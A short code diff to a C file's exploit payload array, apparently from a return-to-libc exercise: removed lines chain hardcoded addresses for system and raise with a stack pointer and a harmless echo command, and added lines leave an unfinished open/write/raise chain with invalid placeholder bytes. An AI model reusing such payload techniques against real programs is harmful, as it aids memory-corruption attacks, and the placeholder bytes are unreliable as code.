@@ -23,14 +23,18 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\x40\x20\xe2\xb3" //0xb3e23040 <system> 0xb3e22040 0xb3e22040 0xb3e22040
-	"\x40\x1d\xe1\xb3" // 0xb3e12d40 <raise> 0xb3e11d40
-	"\x2c\xc3\xff\xbf" // <system arg> pointer to string 
-
-	"\x0c\x00\x00\x00"
-	 // <raise> argument
-	"echo -n xyzzy! > magic.txt";
-	//"echo -n xyzzy! > magic.txt\x0";
+	"\x\x\x\x" //<open>
+	"\x\x\x\x"  //<return>
+	"\x2c\xc3\xff\xbf"; //<first param>
+						//<second param>
+						//<third param>
+						//<write>
+						//<return>
+						//<first param>
+						//<second param>
+						//<third param>
+						//<raise>
+						//<first param>
 
 
 	/* ------------------------------------	*/
